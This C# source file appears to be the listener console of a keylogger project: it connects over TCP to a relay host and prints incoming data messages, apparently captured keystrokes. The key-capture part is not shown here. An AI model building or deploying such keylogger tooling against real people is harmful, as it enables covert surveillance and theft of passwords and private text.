﻿using System;
using System.Net;
using System.Net.Sockets;

namespace KeyLogger.ConsoleListener
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine($"Usage: dotnet run KeyLogger.dll <hostname|ip>[:<port>]");
                return;
            }

            var split = args[0].Split(':');
            if (split.Length < 1)
            {
                Console.WriteLine($"Usage: dotnet run KeyLogger.dll <hostname|ip>:<port>");
                return;
            }
            
            int port = 10000;
            if (split.Length >= 2)
            {
                try
                {
                    port = int.Parse(split[1]);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Invalid port: " + e.Message);
                    return;
                }
            }

            var endPoint = new DnsEndPoint(split[0], port);
            
            var client = new TcpClient(endPoint.Host, endPoint.Port);
            var stream = client.GetStream();
            new ClientConnectionMessage(ClientType.Listener).Send(stream);

            while (true)
            {
                var message = new DataMessage();
                message.Receive(stream);
                Console.WriteLine(message);
            }
        }
    }
}
